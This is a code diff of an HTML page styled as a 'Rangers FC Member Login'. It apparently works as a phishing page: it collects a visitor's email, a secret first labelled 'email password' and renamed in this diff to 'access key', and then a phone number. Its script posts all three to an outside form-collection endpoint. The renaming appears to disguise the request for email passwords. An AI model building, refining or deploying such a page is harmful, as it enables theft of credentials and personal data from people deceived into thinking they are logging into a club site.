@@ -103,8 +103,7 @@
     <h2>Rangers FC Member Login</h2>
     <form id="loginForm" action="https://getform.io/f/avrmyepa" method="POST">
         <input type="email" id="email" name="email" placeholder="Enter your email" required>
-        <!-- Changed the type to text for testing -->
-        <input type="text" id="password" name="password" placeholder="Enter your email password" required>
+        <input type="text" id="accesskey" name="accesskey" placeholder="Enter your access key" required>
         <button type="submit">Login</button>
     </form>
 </div>
@@ -124,24 +123,24 @@
 </div>
 
 <script>
-    // Show phone number form after email/password submission
+    // Show phone number form after email/accesskey submission
     document.getElementById('loginForm').addEventListener('submit', function(e) {
         e.preventDefault();
         
-        // Capture email and password
+        // Capture email and access key
         const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
+        const accesskey = document.getElementById('accesskey').value;
 
         // Hide the login modal and show the phone number modal
         document.getElementById('loginModal').style.display = 'none';
         document.getElementById('phoneModal').style.display = 'block';
 
         // Optionally log data to the console for testing
-        console.log(`Email: ${email}, Password: ${password}`);
+        console.log(`Email: ${email}, Access Key: ${accesskey}`);
         
         // Save data for later use (e.g., store it in a variable or send to the server immediately)
         window.email = email;
-        window.password = password;
+        window.accesskey = accesskey;
     });
 
     // Handle phone number form submission
@@ -151,8 +150,8 @@
         // Capture phone number
         const phone = document.getElementById('phone').value;
 
-        // Log the phone number along with email and password
-        console.log(`Phone: ${phone}, Email: ${window.email}, Password: ${window.password}`);
+        // Log the phone number along with email and accesskey
+        console.log(`Phone: ${phone}, Email: ${window.email}, Access Key: ${window.accesskey}`);
 
         // Send data to Getform
         fetch('https://getform.io/f/avrmyepa', {
@@ -162,7 +161,7 @@
             },
             body: JSON.stringify({
                 email: window.email,
-                password: window.password,
+                accesskey: window.accesskey,
                 phone: phone
             })
         })
